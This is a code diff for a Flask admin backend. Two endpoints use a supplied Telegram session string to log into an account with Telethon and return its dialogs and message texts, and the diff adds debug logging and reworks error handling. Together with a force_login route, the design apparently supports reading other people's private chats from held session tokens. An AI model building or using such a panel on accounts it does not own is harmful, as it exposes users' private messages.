@@ -975,7 +975,6 @@ def force_login():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-
 @app.route("/api/admin/chat_dialogs", methods=["POST"])
 def admin_chat_dialogs():
     if not session.get("admin_logged_in"):
@@ -986,35 +985,38 @@ def admin_chat_dialogs():
     if not session_string:
         return jsonify({"error": "No session string"}), 400
     
+    print(f"[DEBUG] Received session string (length: {len(session_string)})")
+    
     async def fetch_dialogs():
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        await client.connect()
         try:
+            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await client.connect()
+            print("[DEBUG] Connected to Telegram")
             dialogs = await client.get_dialogs()
+            print(f"[DEBUG] Got {len(dialogs)} dialogs")
             result = []
             for d in dialogs:
-                # চ্যাটের নাম ও আইডি বের করুন
-                if d.is_group or d.is_channel:
-                    name = d.name or "Group/Channel"
-                else:
-                    name = d.name or d.entity.first_name or "Unknown"
+                name = d.name or "Unknown"
+                if not name and d.entity:
+                    name = getattr(d.entity, 'first_name', '') or getattr(d.entity, 'title', '') or "Chat"
                 result.append({
                     "id": d.id,
                     "name": name,
                     "unread_count": d.unread_count,
-                    "last_message": d.message.text if d.message else "",
-                    "is_group": d.is_group,
-                    "is_channel": d.is_channel
+                    "last_message": d.message.text[:100] if d.message else ""
                 })
-            return result
+            return result, None
+        except Exception as e:
+            print(f"[ERROR] fetch_dialogs failed: {type(e).__name__}: {e}")
+            return None, str(e)
         finally:
             await client.disconnect()
     
-    try:
-        dialogs = run_async(fetch_dialogs())
+    dialogs, err = run_async(fetch_dialogs())
+    if dialogs is not None:
         return jsonify({"success": True, "dialogs": dialogs})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+    else:
+        return jsonify({"success": False, "error": err})
 
 
 @app.route("/api/admin/chat_messages", methods=["POST"])
@@ -1029,30 +1031,35 @@ def admin_chat_messages():
     if not session_string or not chat_id:
         return jsonify({"error": "Missing parameters"}), 400
     
+    print(f"[DEBUG] Chat messages request - chat_id: {chat_id}, limit: {limit}")
+    
     async def fetch_messages():
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        await client.connect()
         try:
+            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await client.connect()
             entity = await client.get_entity(int(chat_id))
             messages = await client.get_messages(entity, limit=limit)
             result = []
             for msg in messages:
-                sender = msg.sender_id
                 result.append({
                     "id": msg.id,
                     "text": msg.text or msg.caption or "[media]",
-                    "sender_id": sender,
+                    "sender_id": msg.sender_id,
                     "date": msg.date.isoformat() if msg.date else None
                 })
-            return result
+            return result, None
+        except Exception as e:
+            print(f"[ERROR] fetch_messages failed: {type(e).__name__}: {e}")
+            return None, str(e)
         finally:
             await client.disconnect()
     
-    try:
-        messages = run_async(fetch_messages())
-        return jsonify({"success": True, "messages": messages})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
+    msgs, err = run_async(fetch_messages())
+    if msgs is not None:
+        return jsonify({"success": True, "messages": msgs})
+    else:
+        return jsonify({"success": False, "error": err})
+
 
 # ================= RUN =================
 if __name__ == "__main__":
